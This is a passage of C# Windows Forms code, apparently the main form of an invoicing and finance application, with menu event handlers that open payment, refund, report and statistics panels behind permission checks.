        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryPaymentBatch(object sender, EventArgs e)
        {
            var mgr = new PaymentBatchMgr(PaymentBatchMgr.OpBatchType.QUERY);
            SetDetailPanel(mgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryPoolFinanceBatch(object sender, EventArgs e)
        {
            var batchMgr = new FinanceBatchMgr(FinanceBatchMgr.OpBatchType.POOL_QUERY);
            SetDetailPanel(batchMgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryPoolRefundBatch(object sender, EventArgs e)
        {
            var batchMgr = new RefundBatchMgr(RefundBatchMgr.OpBatchType.POOL_QUERY);
            SetDetailPanel(batchMgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryRefundBatch(object sender, EventArgs e)
        {
            var mgr = new RefundBatchMgr(RefundBatchMgr.OpBatchType.QUERY);
            SetDetailPanel(mgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryUsers(object sender, EventArgs e)
        {
            var userMgrUI = new UserMgr();
            SetDetailPanel(userMgrUI);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportARPayment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_REPORT))
            {
                var mgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.REPORT);
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportBug(object sender, EventArgs e)
        {
            var form = new ReportBug();
            form.ShowDialog(this);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportCDA(object sender, EventArgs e)
        {
            var mgr = new CDAMgr(CDAMgr.OpCDAType.REPORT);
            SetDetailPanel(mgr);
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportFee(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_REPORT))
            {
                var mgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.REPORT);
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportFinance(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_REPORT))
            {
                var mgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.REPORT);
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportInvoiceFlaw(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_REPORT))
            {
                var mgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.REPORT);
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportLeger(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_REPORT))
            {
                var mgr = new CaseMgr.CaseMgr();
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ShowFromTray(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Maximized;
            ShowInTaskbar = true;
            notifyIcon.Visible = false;
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void StatCase(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_STAT))
            {
                var mgr = new CaseMgr.CaseMgr(CaseMgr.CaseMgr.OpCaseType.STAT);
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void StatDepartment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_STAT))
            {
                var mgr = new DepartmentMgr(DepartmentMgr.OpDepartmentType.DEPARTMENT_STAT);
                SetDetailPanel(mgr);
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void StatLocation(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_STAT))
            {
                var mgr = new DepartmentMgr(DepartmentMgr.OpDepartmentType.LOCATION_STAT);
                SetDetailPanel(mgr);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void StatCommissionReport(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permissions.INVOICE_STAT))
            {
                var mgr = new CommissionReport();
                SetDetailPanel(mgr);
            }
        }
    }
}